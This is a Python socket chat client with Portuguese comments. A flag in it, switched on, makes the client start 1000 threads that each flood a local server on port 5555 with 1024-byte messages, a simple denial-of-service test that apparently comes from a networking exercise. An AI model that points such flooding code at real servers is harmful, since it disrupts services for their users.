import socket
import threading
import time

dos_attack = True
#define o endereço Ip do servidor
server_host = "localhost"
#define a porta do servidor
server_port = 5555

def handle_send_message(sock):
    while True:
        message_send = input()

        sock.sendall(message_send.encode())

def handle_receive_message(sock):
    while True:
        message_receive = sock.recv(1024)

        print(message_receive.decode())

def handle_dos_attack(sock):
    while True:
        message_send = "F"*1024

        sock.sendall(message_send.encode())

        time.sleep(0.00001)

# cria um objeto socket para o cliente usando TCP/IP
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
    # inicia uma conexão com o servidor, especificando a endereço IP e a porta do servidor
    client_socket.connect((server_host, server_port))

    threads = []

    for i in range(1000):
        if dos_attack:
            dos_thread = threading.Thread(target=handle_dos_attack, args=(client_socket,))
            dos_thread.start()
            threads.append(dos_thread)
        else:
            send_thread = threading.Thread(target=handle_send_message, args=(client_socket,))
            send_thread.start()
            threads.append(send_thread)

    receive_thread = threading.Thread(target=handle_receive_message, args=(client_socket,))
    receive_thread.start()
    threads.append(receive_thread)

    for thread in threads:
        thread.join()

    client_socket.close()

